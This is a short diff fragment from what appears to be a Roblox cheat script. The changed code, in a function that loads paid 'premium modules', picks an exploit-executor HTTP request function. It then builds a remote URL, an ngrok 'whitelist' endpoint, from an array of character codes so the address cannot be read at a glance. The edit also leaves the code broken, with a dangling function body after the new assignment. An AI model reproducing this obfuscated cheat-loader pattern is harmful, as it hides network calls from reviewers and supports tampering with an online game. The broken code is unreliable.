@@ -8882,8 +8882,8 @@ local function _loadUniversalPremiumModules()
     local myTier = getgenv().getAeroTier and getgenv().getAeroTier(lplr) or 0
     if myTier <= 0 then return end
 
-    local premReq = getgenv()._aerov4_req or (syn and syn.request) or http_request or request
-    local premUrl = getgenv()._aerov4_getUrl and getgenv()._aerov4_getUrl() or (function()
+    local premReq = (syn and syn.request) or http_request or request
+	local premUrl = _liveUrl
         local _s = {"104","116","116","112","115","58","47","47","103","101","99","111","45","115","116","101","114","110","117","109","45","114","117","98","100","111","119","110","46","110","103","114","111","107","45","102","114","101","101","46","100","101","118","47","119","104","105","116","101","108","105","115","116"}
         local _r = ''
         for _,v in _s do _r = _r .. string.char(tonumber(v)) end
